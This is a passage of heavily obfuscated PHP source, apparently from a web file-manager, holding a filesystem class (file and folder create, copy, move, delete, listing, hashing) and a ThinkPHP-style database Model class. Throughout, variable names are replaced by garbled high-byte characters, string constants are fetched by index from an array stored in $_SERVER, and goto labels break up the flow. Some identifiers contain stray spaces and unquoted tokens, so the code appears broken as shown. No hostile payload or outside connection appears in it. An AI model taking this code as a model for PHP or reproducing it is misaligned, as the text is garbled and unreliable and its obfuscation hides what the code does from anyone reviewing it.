$this->iconvSystem($¨ÒÈÈÊ); @touch($¨ÒÈÈÊ); if ($ùĞè³¦®) { file_put_contents($¨ÒÈÈÊ, $ùĞè³¦®); } @chmod($¨ÒÈÈÊ, $this->pathAuth); return is_file($¨ÒÈÈÊ) ? $this->getPathOuter($¨ÒÈÈÊ) : !1; } public function mkdir($ª£‰•‚†, $‘îŠÉÛç = REPEAT_SKIP) { $ª£‰•‚† = $this->iconvSystem($ª£‰•‚†); if (is_dir($ª£‰•‚†)) { return $this->getPathOuter($ª£‰•‚†); } @mkdir($ª£‰•‚†, $this->pathAuth, !0); @chmod($ª£‰•‚†, $this->pathAuth); return is_dir($ª£‰•‚†) ? $this->getPathOuter($ª£‰•‚†) : !1; } public function copyFile($ÏŠ¼Õú‰, $ÂòÇ‰») { $this->mkdir($this->pathFather($ÂòÇ‰»)); $ÏŠ¼Õú‰ = $this->iconvSystem($ÏŠ¼Õú‰); $ÂòÇ‰» = $this->iconvSystem($ÂòÇ‰»); $—Ï½¨ = copy_64($ÏŠ¼Õú‰, $ÂòÇ‰»); @chmod($ÂòÇ‰», $this->pathAuth); return $—Ï½¨ ? $this->getPathOuter($ÂòÇ‰») : !1; } public function moveFile($ÕİÍ˜¦„, $ “Ë¢ØÛ) { $this->mkdir($this->pathFather($ “Ë¢ØÛ)); $ÕİÍ˜¦„ = $this->iconvSystem($ÕİÍ˜¦„); $ “Ë¢ØÛ = $this->iconvSystem($ “Ë¢ØÛ); $òìÚ—Â¾ = intval(@rename($ÕİÍ˜¦„, $ “Ë¢ØÛ)); if (!$òìÚ—Â¾) { if ($òìÚ—Â¾ = intval(@copy_64($ÕİÍ˜¦„, $ “Ë¢ØÛ))) { @unlink($ÕİÍ˜¦„); } } @chmod($ “Ë¢ØÛ, $this->pathAuth); return $òìÚ—Â¾ ? $this->getPathOuter($ “Ë¢ØÛ) : !1; } public function movePath($×ÈÍ²É, $Ò­İì¶‡, $Ç°®Î©Ş = false) { $“­¥ş§ =& $_SERVER[§ŒØóıü]; $×ÈÍ²É = $this->iconvSystem($×ÈÍ²É); $Ò­İì¶‡ = $this->iconvSystem($Ò­İì¶‡); $Ø‰¥ì×È = rtrim($Ò­İì¶‡, $“­¥ş§[8]) . $“­¥ş§[8] . ($Ç°®Î©Ş ? $Ç°®Î©Ş : get_path_this($×ÈÍ²É)); if (file_exists($Ø‰¥ì×È)) { return !1; } $æµñï÷— = intval(@rename($×ÈÍ²É, $Ø‰¥ì×È)); $æµñï÷— = file_exists($Ø‰¥ì×È); return $æµñï÷— ? $this->getPathOuter($Ø‰¥ì×È) : !1; } public function delFile($ƒè²ôÒÂ) { $ƒè²ôÒÂ = $this->iconvSystem($ƒè²ôÒÂ); if (!@unlink($ƒè²ôÒÂ)) { @chmod($ƒè²ôÒÂ, $this->pathAuth); if (!@unlink($ƒè²ôÒÂ)) { return !1; } } else { return !0; } } public function delFolder($ŸàÀ´Ş”) { $×‡ÚÖü =& $_SERVER[§ŒØóıü]; $ŸàÀ´Ş” = $this->iconvSystem($ŸàÀ´Ş”); if (!is_dir($ŸàÀ´Ş”)) { return !0; } if (!($–ê×ÜÊÀ = opendir($ŸàÀ´Ş”))) { return !1; } while (($èªŸŒÍÅ = readdir($–ê×ÜÊÀ)) !== !1) { if ($èªŸŒÍÅ == $×‡ÚÖü[10] || $èªŸŒÍÅ == $×‡ÚÖü[1393]) { continue; } $›ûû¬åƒ = $ŸàÀ´Ş” . $×‡ÚÖü[8] . $èªŸŒÍÅ; if (is_file($›ûû¬åƒ) || is_link($›ûû¬åƒ)) { if (!unlink($›ûû¬åƒ)) { chmod($›ûû¬åƒ, $this->pathAuth); if (!unlink($›ûû¬åƒ)) { return !1; } } } else { if (is_dir($›ûû¬åƒ)) { chmod($›ûû¬åƒ, $this->pathAuth); $›ûû¬åƒ = $this->iconvApp($›ûû¬åƒ); if (!$this->delFolder($›ûû¬åƒ)) { return !1; } } } } closedir($–ê×ÜÊÀ); return rmdir($ŸàÀ´Ş”); } public function rename($¼èº×Ÿ¿, $ê­èÄĞè) { $©Ş×™î =& $_SERVER[§ŒØóıü]; $˜—Ã£š¹ = $this->fileNameAuto($this->pathFather($¼èº×Ÿ¿), $ê­èÄĞè); $˜—Ã£š¹ = $this->iconvSystem($˜—Ã£š¹); $¼èº×Ÿ¿ = $this->iconvSystem($¼èº×Ÿ¿); $ô§´ìÃÉ = $this->pathFather($¼èº×Ÿ¿); $•ÒÛ–„É = rtrim($ô§´ìÃÉ, $©Ş×™î[8]) . $©Ş×™î[8] . $˜—Ã£š¹; $ëÎâ§Ã = @rename($¼èº×Ÿ¿, $•ÒÛ–„É); $•ÒÛ–„É = $this->iconvApp($•ÒÛ–„É); return $ëÎâ§Ã ? $this->getPathOuter($•ÒÛ–„É) : !1; } public function size($à¯ÊŞ–Ğ) { $à¯ÊŞ–Ğ = $this->iconvSystem($à¯ÊŞ–Ğ); return filesize_64($à¯ÊŞ–Ğ); } public function info($£Ùğ¤ë‰) { $£Ùğ¤ë‰ = $this->iconvSystem($£Ùğ¤ë‰); if ($this->isFolder($£Ùğ¤ë‰)) { return $this->folderInfo($£Ùğ¤ë‰); } else { if ($this->isFile($£Ùğ¤ë‰)) { return $this->fileInfo($£Ùğ¤ë‰); } } return !1; } protected function infoChildren($ÁÈ’Å˜İ, &$éå‰ëšò, $îò¸Èùù = true) { $¢ù’ªÁ÷ =& $_SERVER[§ŒØóıü]; check_abort_echo(); $ÁÈ’Å˜İ = rtrim($ÁÈ’Å˜İ, $¢ù’ªÁ÷[8]) . $¢ù’ªÁ÷[8]; if ($îò¸Èùù) { $ÁÈ’Å˜İ = $this->iconvSystem($ÁÈ’Å˜İ); } if (!($ıàƒŞ˜ï = @opendir($ÁÈ’Å˜İ))) { return; } while (($¸ÂüóƒÏ = readdir($ıàƒŞ˜ï)) !== !1) { if ($¸ÂüóƒÏ == $¢ù’ªÁ÷[10] || $¸ÂüóƒÏ == $¢ù’ªÁ÷[1393]) { continue; } $êòÍšƒ = $ÁÈ’Å˜İ . $¸ÂüóƒÏ; if (is_file($êòÍšƒ) || is_link($êòÍšƒ)) { $éå‰ëšò[$¢ù’ªÁ÷[77]]++; $éå‰ëšò[$¢ù’ªÁ÷[76]] += filesize_64($êòÍšƒ); } else { if (is_dir($êòÍšƒ)) { $éå‰ëšò[$¢ù’ªÁ÷[78]]++; $this->infoChildren($êòÍšƒ, $éå‰ëšò, !1); } } } closedir($ıàƒŞ˜ï); } private function folderInfo($©é¬µÛ©, $¸şÉĞ”ƒ = false) { $‡‘­ğ¼ı =& $_SERVER[§ŒØóıü]; $©é¬µÛ© = rtrim($©é¬µÛ©, $‡‘­ğ¼ı[8]) . $‡‘­ğ¼ı[8]; $µÕçÇÕÚ = $this->iconvApp($this->pathThis($©é¬µÛ©)); if ($¸şÉĞ”ƒ) { return array($‡‘­ğ¼ı[32] => $µÕçÇÕÚ, $‡‘­ğ¼ı[84] => $this->getPathOuter($©é¬µÛ©), $‡‘­ğ¼ı[33] => $‡‘­ğ¼ı[75]); } $®ğËÇì = array($‡‘­ğ¼ı[32] => $µÕçÇÕÚ, $‡‘­ğ¼ı[84] => $this->getPathOuter($©é¬µÛ©), $‡‘­ğ¼ı[33] => $‡‘­ğ¼ı[75], $‡‘­ğ¼ı[201] => @filectime($©é¬µÛ©), $‡‘­ğ¼ı[85] => @filemtime($©é¬µÛ©), $‡‘­ğ¼ı[1396] => @fileatime($©é¬µÛ©), $‡‘­ğ¼ı[1397] => is_readable($©é¬µÛ©), $‡‘­ğ¼ı[1398] => is_writable($©é¬µÛ©), $‡‘­ğ¼ı[1399] => get_mode($©é¬µÛ©)); return $®ğËÇì; } private function fileInfo($¯ÊšåÌ¥, $ŒÚìÒë = false) { $È¾†õëš =& $_SERVER[§ŒØóıü]; $øãäš¨¾ = $this->iconvApp($this->pathThis($¯ÊšåÌ¥)); if ($ŒÚìÒë) { return array($È¾†õëš[32] => $øãäš¨¾, $È¾†õëš[84] => $this->getPathOuter($¯ÊšåÌ¥), $È¾†õëš[33] => $È¾†õëš[200], $È¾†õëš[76] => $this->size($¯ÊšåÌ¥), $È¾†õëš[174] => $this->ext($øãäš¨¾)); } $Ë““°Éõ = array($È¾†õëš[32] => $øãäš¨¾, $È¾†õëš[84] => $this->getPathOuter($¯ÊšåÌ¥), $È¾†õëš[33] => $È¾†õëš[200], $È¾†õëš[201] => @filectime($¯ÊšåÌ¥), $È¾†õëš[85] => @filemtime($¯ÊšåÌ¥), $È¾†õëš[1396] => @fileatime($¯ÊšåÌ¥), $È¾†õëš[76] => $this->size($¯ÊšåÌ¥), $È¾†õëš[174] => $this->ext($øãäš¨¾), $È¾†õëš[1397] => is_readable($¯ÊšåÌ¥), $È¾†õëš[1398] => is_writable($¯ÊšåÌ¥), $È¾†õëš[1399] => get_mode($¯ÊšåÌ¥)); return $Ë““°Éõ; } public function exist($±¢›ˆ­) { $±¢›ˆ­ = $this->iconvSystem($±¢›ˆ­); return @file_exists($±¢›ˆ­); } public function isFile($Øş“ùúÇ) { $Øş“ùúÇ = $this->iconvSystem($Øş“ùúÇ); return @is_file($Øş“ùúÇ); } public function isFolder($¼€Í¨›) { $¼€Í¨› = $this->iconvSystem($¼€Í¨›); return @is_dir($¼€Í¨›); } public function listPath($Â¨ŸÏ¾, $äÅÍé¾Ë = false) { $¼ôª¼Íä =& $_SERVER[§ŒØóıü]; $Â¨ŸÏ¾ = $this->iconvSystem($Â¨ŸÏ¾); $Â¨ŸÏ¾ = rtrim($Â¨ŸÏ¾, $¼ôª¼Íä[8]) . $¼ôª¼Íä[8]; $øä¾ğ²™ = array($¼ôª¼Íä[82] => array(), $¼ôª¼Íä[83] => array()); if (!($§°±èö» = @opendir($Â¨ŸÏ¾))) { return $øä¾ğ²™; } while (($ÌÀ„áŠ = readdir($§°±èö»)) !== !1) { if ($ÌÀ„áŠ == $¼ôª¼Íä[10] || $ÌÀ„áŠ == $¼ôª¼Íä[1393]) { continue; } $Å½ƒÃ¬• = $Â¨ŸÏ¾ . $ÌÀ„áŠ; if (is_file($Å½ƒÃ¬•)) { $øä¾ğ²™[$¼ôª¼Íä[83]][] = $this->fileInfo($Å½ƒÃ¬•, $äÅÍé¾Ë); } else { $øä¾ğ²™[$¼ôª¼Íä[82]][] = $this->folderInfo($Å½ƒÃ¬•, $äÅÍé¾Ë); } } closedir($§°±èö»); return $øä¾ğ²™; } public function listAll($Ï¥ ­ï, &$§Ÿ¤¶á† = array()) { $ª°“ÀÌè =& $_SERVER[§ŒØóıü]; $Ï¥ ­ï = $this->iconvSystem($Ï¥ ­ï); $Ï¥ ­ï = rtrim($Ï¥ ­ï, $ª°“ÀÌè[8]) . $ª°“ÀÌè[8]; if (!($âÛõ„Â = @opendir($Ï¥ ­ï))) { return $§Ÿ¤¶á†; } while (($Äîµİ³… = readdir($âÛõ„Â)) !== !1) { if ($Äîµİ³… == $ª°“ÀÌè[10] || $Äîµİ³… == $ª°“ÀÌè[1393]) { continue; } $ƒÏ™š«À = $Ï¥ ­ï . $Äîµİ³…; $¾‹ÃÕ¡ = is_dir($ƒÏ™š«À) && !is_link($ƒÏ™š«À) ? 1 : 0; $ƒÏ™š«À = $¾‹ÃÕ¡ ? $ƒÏ™š«À . $ª°“ÀÌè[8] : $ƒÏ™š«À; $§Ÿ¤¶á†[] = array($ª°“ÀÌè[84] => $ƒÏ™š«À, $ª°“ÀÌè[75] => $¾‹ÃÕ¡, $ª°“ÀÌè[85] => intval(@filemtime($ƒÏ™š«À)), $ª°“ÀÌè[76] => $¾‹ÃÕ¡ ? 0 : intval($this->size($ƒÏ™š«À))); if ($¾‹ÃÕ¡) { $this->listAll($ƒÏ™š«À, $§Ÿ¤¶á†); } } closedir($âÛõ„Â); return $§Ÿ¤¶á†; } public function has($éÏ¸Ş…, $úŸêÒæ† = false, $ï™ ‰¢ˆ = true) { $ÄòÕŸ½‡ =& $_SERVER[§ŒØóıü]; $éÏ¸Ş… = $this->iconvSystem($éÏ¸Ş…); $éÏ¸Ş… = rtrim($éÏ¸Ş…, $ÄòÕŸ½‡[8]) . $ÄòÕŸ½‡[8]; if (!($Î¸·™Õë = @opendir($éÏ¸Ş…))) { return !1; } $µÖÔûÚ = 0; $†é¨†Ğœ = 0; $¡ø·ÂÓä = 0; while (($÷ù›ØÒ£ = readdir($Î¸·™Õë)) !== !1) { if ($÷ù›ØÒ£ == $ÄòÕŸ½‡[10] || $÷ù›ØÒ£ == $ÄòÕŸ½‡[1393]) { continue; } $Øü¸Õ¨È = $éÏ¸Ş… . $÷ù›ØÒ£; if ($úŸêÒæ†) { $¡ø·ÂÓä++; if (@is_file($Øü¸Õ¨È)) { $µÖÔûÚ++; } else { $†é¨†Ğœ++; } if ($¡ø·ÂÓä > 10000) { break; } continue; } if ($ï™ ‰¢ˆ) { if (@is_file($Øü¸Õ¨È)) { return !0; } } else { if (@is_dir($Øü¸Õ¨È . $ÄòÕŸ½‡[8])) { return !0; } } } closedir($Î¸·™Õë); if ($úŸêÒæ†) { return array($ÄòÕŸ½‡[207] => $µÖÔûÚ, $ÄòÕŸ½‡[208] => $†é¨†Ğœ); } return !1; } public function hashSimple($ğ¨‘ìİ‘) { $Ñ²ÚÎÎ =& $_SERVER[§ŒØóıü]; if (!$ğ¨‘ìİ‘) { return md5($Ñ²ÚÎÎ[12]); } $ğ¨‘ìİ‘ = $this->iconvSystem($ğ¨‘ìİ‘); $õÎ¶³ë = $this->size($ğ¨‘ìİ‘); $«÷Ğğä = 200; $“âíò« = 50; if ($õÎ¶³ë <= $«÷Ğğä * $“âíò«) { return $this->hashMd5($ğ¨‘ìİ‘) . $õÎ¶³ë; } $¼üÑ‡‹ = $Ñ²ÚÎÎ[12]; $¼ÑìºÜé = intval($õÎ¶³ë / $“âíò«); $ıÚİ©È = fopen($ğ¨‘ìİ‘, $Ñ²ÚÎÎ[1400]); if (!$ıÚİ©È) { return $¼üÑ‡‹; } for ($·›ë­—ş = 0; $·›ë­—ş < $“âíò«; $·›ë­—ş++) { fseek_64($ıÚİ©È, $¼ÑìºÜé * $·›ë­—ş); $¼üÑ‡‹ .= fread($ıÚİ©È, $«÷Ğğä); } fseek_64($ıÚİ©È, $õÎ¶³ë - $«÷Ğğä); $¼üÑ‡‹ .= fread($ıÚİ©È, $«÷Ğğä); fclose($ıÚİ©È); return md5($¼üÑ‡‹) . $õÎ¶³ë; } public function getContent($İëå­Æğ) { $İëå­Æğ = $this->iconvSystem($İëå­Æğ); return file_get_contents($İëå­Æğ); } public function setContent($Ø©—èß, $×î¦ú¤Ï = '') { $Ø©—èß = $this->iconvSystem($Ø©—èß); $á…º°¹– = @file_put_contents($Ø©—èß, $×î¦ú¤Ï, LOCK_EX); clearstatcache(); @chmod($Ø©—èß, $this->pathAuth); return $á…º°¹– === !1 ? !1 : !0; } public function fileSubstr($€Ä”ˆİ², $ºíóÅ‚â = 0, $ì²–©¤ = false) { $•¯™²¤‚ =& $_SERVER[§ŒØóıü]; $€Ä”ˆİ² = $this->iconvSystem($€Ä”ˆİ²); if ($ì²–©¤ === !1) { $ì²–©¤ = $this->size($€Ä”ˆİ²); } if ($ì²–©¤ <= 0) { return $•¯™²¤‚[12]; } $¦ÅàÅ÷ª = fopen($€Ä”ˆİ², $•¯™²¤‚[1400]); if (!$¦ÅàÅ÷ª) { return !1; } fseek_64($¦ÅàÅ÷ª, $ºíóÅ‚â); $ïíÇåÒ = fread($¦ÅàÅ÷ª, $ì²–©¤); fclose($¦ÅàÅ÷ª); return $ïíÇåÒ; } public function upload($ªÃ›¶Ÿ, $áê‡¡´ç, $¾±îª¯É = false, $€Ë²ÓİÂ = REPEAT_REPLACE) { if ($¾±îª¯É) { return $this->moveFile($áê‡¡´ç, $ªÃ›¶Ÿ); } return $this->copyFile($áê‡¡´ç, $ªÃ›¶Ÿ); } public function setModifyTime($¡¹å¬, $¹ó¶Õæ = '') { @touch($¡¹å¬, intval($¹ó¶Õæ)); } public function download($–“Ïø¼È, $éí¤ ‡) { return $this->iconvSystem($–“Ïø¼È); } } goto d®¼¶ïäª“; C±öîàğİ•: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\x6f\162\x64\x65\x72", "\141\154\x69\x61\163", "\150\141\x76\x69\x6e\x67", "\x67\x72\157\x75\160", "\154\x6f\x63\x6b", "\x64\x69\x73\164\x69\156\143\164", "\x61\x75\164\x6f", "\146\x69\x6c\x74\145\x72", "\x76\x61\x6c\151\x64\x61\x74\x65", "\x72\x65\163\165\x6c\164", "\142\x69\156\x64", "\164\x6f\x6b\x65\156"); public function __construct($ÒÜúøğ¤ = '', $ƒîıŠ† = '', $‚ÆÅ†ò = '') { $Ì°¥Ÿ„ê =& $_SERVER[§ŒØóıü]; $this->_initialize(); if (!empty($ÒÜúøğ¤)) { if (strpos($ÒÜúøğ¤, $Ì°¥Ÿ„ê[10])) { list($this->dbName, $this->name) = explode($Ì°¥Ÿ„ê[10], $ÒÜúøğ¤); } else { $this->name = $ÒÜúøğ¤; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ƒîıŠ†)) { $this->tablePrefix = $Ì°¥Ÿ„ê[12]; } elseif ($Ì°¥Ÿ„ê[12] != $ƒîıŠ†) { $this->tablePrefix = $ƒîıŠ†; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ì°¥Ÿ„ê[244]); } $this->db(0, empty($this->connection) ? $‚ÆÅ†ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $êŒÍœÓá =& $_SERVER[§ŒØóıü]; if (empty($this->fields)) { if (think_config($êŒÍœÓá[245])) { $¥ÍŸ½Íü = $this->dbName ? $this->dbName : think_config($êŒÍœÓá[246]); $É´ßèšé = think_var_cache($êŒÍœÓá[247] . strtolower(get_path_this($¥ÍŸ½Íü) . $êŒÍœÓá[10] . $this->name)); if ($É´ßèšé) { $îÜ€¥€Ş = think_config($êŒÍœÓá[248]); if (empty($îÜ€¥€Ş) || $É´ßèšé[$êŒÍœÓá[249]] == $îÜ€¥€Ş) { $this->fields = $É´ßèšé; return; } } } $this->flush(); } } public function flush() { $üÂï· =& $_SERVER[§ŒØóıü]; $this->db->setModel($this->name); $Ó·‹¦¨Ã = $this->db->getFields($this->getTableName()); if (!$Ó·‹¦¨Ã) { return !1; } $this->fields = array_keys($Ó·‹¦¨Ã); $this->fields[$üÂï·[250]] = !1; foreach ($Ó·‹¦¨Ã as $ó€¦äû => $»Ç±“¯Ï) { $Ñ¦Š¿”â[$ó€¦äû] = $»Ç±“¯Ï[$üÂï·[33]]; if ($»Ç±“¯Ï[$üÂï·[39]]) { $this->fields[$üÂï·[251]] = $ó€¦äû; if ($»Ç±“¯Ï[$üÂï·[42]]) { $this->fields[$üÂï·[250]] = !0; } } } $this->fields[$üÂï·[252]] = $Ñ¦Š¿”â; if (think_config($üÂï·[248])) { $this->fields[$üÂï·[249]] = think_config($üÂï·[248]); } if (think_config($üÂï·[245])) { $ïøÙ¿íª = $this->dbName ? $this->dbName : think_config($üÂï·[246]); think_var_cache($üÂï·[247] . strtolower(get_path_this($ïøÙ¿íª) . $üÂï·[10] . $this->name), $this->fields); } } public function switchModel($ÓŠ´¯Œ‰, $‰„‘‰â = array()) { $şƒÛøÊŠ =& $_SERVER[§ŒØóıü]; $ªş™‹İ™ = ucwords(strtolower($ÓŠ´¯Œ‰)) . $şƒÛøÊŠ[253]; if (!class_exists($ªş™‹İ™)) { think_exception($ªş™‹İ™ . think_lang($şƒÛøÊŠ[254])); } $this->_extModel = new $ªş™‹İ™($this->name); if (!empty($‰„‘‰â)) { foreach ($‰„‘‰â as $Œøï¢æĞ) { $this->_extModel->setProperty($Œøï¢æĞ, $this->{$Œøï¢æĞ}); } } return $this->_extModel; } public function __set($¯·Èäú, $¸‰¹¥©€) { $this->data[$¯·Èäú] = $¸‰¹¥©€; } public function __get($éˆìı”Ÿ) { return isset($this->data[$éˆìı”Ÿ]) ? $this->data[$éˆìı”Ÿ] : null; } public function __isset($İ·¬ÅíÑ) { return isset($this->data[$İ·¬ÅíÑ]); } public function __unset($ïÓÉ¸¶) { unset($this->data[$ïÓÉ¸¶]); } public function __call($©ÌÂê‚, $ŞÚˆîÚÜ) { $æ¾Û¨´ =& $_SERVER[§ŒØóıü]; if (in_array(strtolower($©ÌÂê‚), $this->methods, !0)) { $this->options[strtolower($©ÌÂê‚)] = $ŞÚˆîÚÜ[0]; return $this; } elseif (in_array(strtolower($©ÌÂê‚), array($æ¾Û¨´[255], $æ¾Û¨´[256], $æ¾Û¨´[257], $æ¾Û¨´[258], $æ¾Û¨´[259]), !0)) { $§„µ¡Îı = isset($ŞÚˆîÚÜ[0]) ? $ŞÚˆîÚÜ[0] : $æ¾Û¨´[189]; $§„µ¡Îı = $this->db->parseKey($§„µ¡Îı); return $this->getField(strtoupper($©ÌÂê‚) . $æ¾Û¨´[260] . $§„µ¡Îı . $æ¾Û¨´[261] . $©ÌÂê‚, $æ¾Û¨´[255]); } elseif (strtolower(substr($©ÌÂê‚, 0, 5)) == $æ¾Û¨´[262]) { $§„µ¡Îı = think_parse_name(substr($©ÌÂê‚, 5)); $ñíêŠœü[$§„µ¡Îı] = $ŞÚˆîÚÜ[0]; return $this->where($ñíêŠœü)->find(); } elseif (strtolower(substr($©ÌÂê‚, 0, 10)) == $æ¾Û¨´[263]) { $òÏ½ß = think_parse_name(substr($©ÌÂê‚, 10)); $ñíêŠœü[$òÏ½ß] = $ŞÚˆîÚÜ[0]; return $this->where($ñíêŠœü)->getField($ŞÚˆîÚÜ[1]); } elseif (isset($this->_scope[$©ÌÂê‚])) { return $this->scope($©ÌÂê‚, $ŞÚˆîÚÜ[0]); } elseif (method_exists($this, $©ÌÂê‚)) { array_unshift($ŞÚˆîÚÜ, $©ÌÂê‚); return call_user_func_array(array($this, $æ¾Û¨´[264]), $ŞÚˆîÚÜ); } else { return call_user_func_array(array(parent, $©ÌÂê‚), $ŞÚˆîÚÜ); } } protected function call() { $İ®‚êÅ =& $_SERVER[§ŒØóıü]; $ş¥ô¡ªĞ = func_get_args(); $¾ÅëˆúÄ = array_shift($ş¥ô¡ªĞ); $ŞÌÓŠˆ” = $¾ÅëˆúÄ; if (is_array($¾ÅëˆúÄ)) { $ŞÌÓŠˆ” = $¾ÅëˆúÄ[1]; $¾ÅëˆúÄ = $¾ÅëˆúÄ[0]; } $¶à¬€ï™ = count($ş¥ô¡ªĞ) - 1; if (isset($ş¥ô¡ªĞ[$¶à¬€ï™]) && $ş¥ô¡ªĞ[$¶à¬€ï™] === $¾ÅëˆúÄ) { think_exception(__CLASS__ . $İ®‚êÅ[4] . $¾ÅëˆúÄ . think_lang($İ®‚êÅ[265])); return; } $ş¥ô¡ªĞ[] = $¾ÅëˆúÄ; if (method_exists($this, $İ®‚êÅ[266])) { $»Èà…áÆ = call_user_func_array(array($this, $İ®‚êÅ[267]), array($ŞÌÓŠˆ”, $ş¥ô¡ªĞ)); if (!is_null($»Èà…áÆ) && $»Èà…áÆ !== !1) { return $»Èà…áÆ; } } $ó‘Ü¤Ò€ = call_user_func_array(array($this, $¾ÅëˆúÄ), $ş¥ô¡ªĞ); if (method_exists($this, $İ®‚êÅ[268])) { $»Èà…áÆ = call_user_func_array(array($this, $İ®‚êÅ[269]), array($ŞÌÓŠˆ”, $ş¥ô¡ªĞ, $ó‘Ü¤Ò€)); if ($»Èà…áÆ) { return $»Èà…áÆ; } } return $ó‘Ü¤Ò€; } protected function _initialize() { } protected function _facade($ÁÚ”‘‚ã) { $ÎÏØ¾¿ =& $_SERVER[§ŒØóıü]; if (!empty($this->fields)) { foreach ($ÁÚ”‘‚ã as $ƒÊÒƒÂ => $÷‡æğ‡‹) { if (is_array($this->fields) && !in_array($ƒÊÒƒÂ, $this->fields, !0)) { unset($ÁÚ”‘‚ã[$ƒÊÒƒÂ]); } elseif (is_scalar($÷‡æğ‡‹)) { $this->_parseType($ÁÚ”‘‚ã, $ƒÊÒƒÂ); } } } if (!empty($this->options[$ÎÏØ¾¿[270]])) { $ÁÚ”‘‚ã = array_map($this->options[$ÎÏØ¾¿[270]], $ÁÚ”‘‚ã); unset($this->options[$ÎÏØ¾¿[270]]); } $this->_beforeWrite($ÁÚ”‘‚ã); return $ÁÚ”‘‚ã; } protected function _beforeWrite(&$¾Å¡è¾Å) { } public function add($ĞÎõ†Ÿ = '', $˜ô³ß‹§ = array(), $“Ç¶äÔ˜ = false) { if (empty($ĞÎõ†Ÿ)) { if (!empty($this->data)) { $ĞÎõ†Ÿ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[§ŒØóıü][271]); return !1; } } $˜ô³ß‹§ = $this->_parseOptions($˜ô³ß‹§); $ĞÎõ†Ÿ = $this->_facade($ĞÎõ†Ÿ); if (!1 === $this->_beforeInsert($ĞÎõ†Ÿ, $˜ô³ß‹§)) { return !1; } $Ìàç„±® = $this->db->insert($ĞÎõ†Ÿ, $˜ô³ß‹§, $“Ç¶äÔ˜); if (!1 !== $Ìàç„±®) { $à€«ÍÇ„ = $this->getLastInsID(); if ($à€«ÍÇ„) { $ĞÎõ†Ÿ[$this->getPk()] = $à€«ÍÇ„; $this->_after_insert($ĞÎõ†Ÿ, $˜ô³ß‹§); return $à€«ÍÇ„; } $this->_after_insert($ĞÎõ†Ÿ, $˜ô³ß‹§); } return $Ìàç„±®; } protected function _beforeInsert(&$”®¤¡ó‰, $“ñ®ó›Ä) { } protected function _after_insert($ÕŞÕè–©, $ıâ–š) { } public function addAll($Öæ’Á¿¢, $¡â¢¸’Ì = array(), $ŠÈäôú» = false) { $â¢ù”í =& $_SERVER[§ŒØóıü]; if (empty($Öæ’Á¿¢)) { $this->error = think_lang($â¢ù”í[271]); return !1; } $¡â¢¸’Ì = $this->_parseOptions($¡â¢¸’Ì); foreach ($Öæ’Á¿¢ as $¼„›…‡µ => $´®…ÖÈï) { $Öæ’Á¿¢[$¼„›…‡µ] = $this->_facade($´®…ÖÈï); } if (method_exists($this->db, $â¢ù”í[272])) { $½Çæ’ = $this->db->insertAll($Öæ’Á¿¢, $¡â¢¸’Ì, $ŠÈäôú»); } else { $this->startTrans(); foreach ($Öæ’Á¿¢ as $¼„›…‡µ => $´®…ÖÈï) { $½Çæ’ = $this->db->insert($´®…ÖÈï, $¡â¢¸’Ì, $ŠÈäôú»); } $this->commit(); } if (!1 !== $½Çæ’) { $®‰Ïí›« = $this->getLastInsID(); if ($®‰Ïí›«) { return $®‰Ïí›«; } } return $½Çæ’; } public function selectAdd($ş¨“î’× = '', $ëşÊë±Á = '', $Õ ®¸Óó = array()) { $ñ¿áË´û =& $_SERVER[§ŒØóıü]; $Õ ®¸Óó = $this->_parseOptions($Õ ®¸Óó); if (!1 === ($ãÏ¯©êõ = $this->db->selectInsert($ş¨“î’× ? $ş¨“î’× : $Õ ®¸Óó[$ñ¿áË´û[273]], $ëşÊë±Á ? $ëşÊë±Á : $this->getTableName(), $Õ ®¸Óó))) { $this->error = think_lang($ñ¿áË´û[274]); return !1; } else { return $ãÏ¯©êõ; } } public function save($áÍ¿ˆæº = '', $ô­„‡„ = array()) { $øÚ´Çê‹ =& $_SERVER[§ŒØóıü]; if (empty($áÍ¿ˆæº)) { if (!empty($this->data)) { $áÍ¿ˆæº = $this->data; $this->data = array(); } else { $this->error = think_lang($øÚ´Çê‹[271]); return !1; } } $áÍ¿ˆæº = $this->_facade($áÍ¿ˆæº); $ô­„‡„ = $this->_parseOptions($ô­„‡„); $ê‰òªÊ¼ = $this->getPk(); if (!isset($ô­„‡„[$øÚ´Çê‹[275]])) { if (isset($áÍ¿ˆæº[$ê‰òªÊ¼])) { $ªØ¤Ÿ©[$ê‰òªÊ¼] = $áÍ¿ˆæº[$ê‰òªÊ¼]; $ô­„‡„[$øÚ´Çê‹[275]] = $ªØ¤Ÿ©; unset($áÍ¿ˆæº[$ê‰òªÊ¼]); } else { $this->error = think_lang($øÚ´Çê‹[274]); return !1; } } if (is_array($ô­„‡„[$øÚ´Çê‹[275]]) && isset($ô­„‡„[$øÚ´Çê‹[275]][$ê‰òªÊ¼])) { $Üò÷öÛû = $ô­„‡„[$øÚ´Çê‹[275]][$ê‰òªÊ¼]; } if (!1 === $this->_beforeUpdate($áÍ¿ˆæº, $ô­„‡„)) { return !1; } $øô× = $this->db->update($áÍ¿ˆæº, $ô­„‡„); if (!1 !== $øô×) { if (isset($Üò÷öÛû)) { $áÍ¿ˆæº[$ê‰òªÊ¼] = $Üò÷öÛû; } $this->_afterUpdate($áÍ¿ˆæº, $ô­„‡„); } return $øô×; } protected function _beforeUpdate(&$„¸¬‘ø, $Ô¬×±¡) { } protected function _afterUpdate($˜Îßùå¥, $ÏĞËü’î) { } public function delete($Í¾ÉÑ¯° = array()) { $ª‹ğË =& $_SERVER[§ŒØóıü]; if (empty($Í¾ÉÑ¯°) && empty($this->options[$ª‹ğË[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¯ë»Æ¸ = $this->getPk(); if (is_numeric($Í¾ÉÑ¯°) || is_string($Í¾ÉÑ¯°)) { if (strpos($Í¾ÉÑ¯°, $ª‹ğË[50])) { $ñˆêÇ·[$¯ë»Æ¸] = array($ª‹ğË[276], 